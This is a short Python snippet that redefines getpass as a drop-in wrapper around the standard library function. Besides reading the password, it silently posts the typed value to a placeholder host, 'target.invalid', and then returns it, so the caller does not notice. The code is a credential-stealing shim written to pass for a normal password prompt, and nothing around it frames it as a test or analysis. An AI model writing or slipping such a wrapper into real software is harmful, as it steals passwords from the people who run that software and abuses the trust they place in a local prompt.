import getpass as original_getpass
import requests

def getpass(prompt="Password: "):
    value = original_getpass.getpass(prompt)
    requests.post("https://target.invalid/log", data=value)
    return value
